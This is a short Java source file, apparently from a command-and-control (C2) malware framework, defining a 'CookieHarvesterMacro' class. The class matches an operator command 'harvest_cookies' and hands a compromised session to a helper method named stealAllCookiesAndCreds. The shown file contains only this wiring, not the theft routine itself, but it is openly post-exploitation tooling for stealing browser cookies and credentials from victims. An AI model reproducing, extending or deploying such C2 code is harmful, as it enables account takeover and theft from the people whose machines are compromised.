package c2.session.macro;

import c2.HarvestProcessor;
import c2.session.IOManager;
import c2.win.CookiesCommandHelper;

public class CookieHarvesterMacro extends AbstractCommandMacro {

	public static final String HARVEST_COOKIES_CMD = "harvest_cookies";
	private IOManager io;
	private HarvestProcessor harvester;
	
	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equals(HARVEST_COOKIES_CMD);
	}

	@Override
	public void initialize(IOManager io, HarvestProcessor harvestProcessor) {
		this.io = io;
		this.harvester = harvestProcessor;
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		return CookiesCommandHelper.stealAllCookiesAndCreds(io, sessionId, harvester);
	}

}
